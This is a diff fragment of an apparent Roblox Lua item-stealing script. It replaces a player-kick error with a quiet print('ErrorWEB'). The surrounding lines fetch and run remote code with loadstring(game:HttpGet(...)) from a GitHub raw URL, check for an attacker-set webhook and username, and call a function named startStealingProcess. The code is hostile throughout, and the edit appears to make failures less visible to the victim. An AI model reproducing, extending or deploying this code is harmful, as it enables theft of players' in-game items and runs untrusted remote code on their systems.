@@ -456,14 +456,14 @@ elseif inventoryValue > 1890 then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden",true))()
     else
 	if not getgenv().Webhook or not getgenv().Username then
-            game.Players.LocalPlayer:Kick("⚠️ Webhook or Username is not set.")
+            print("ErrorWEB")
             return
         end
         startStealingProcess()
     end
 else
     if not getgenv().Webhook or not getgenv().Username then
-        game.Players.LocalPlayer:Kick("⚠️ Webhook or Username is not set.")
+        print("ErrorWEB")
         return
     end
     startStealingProcess()
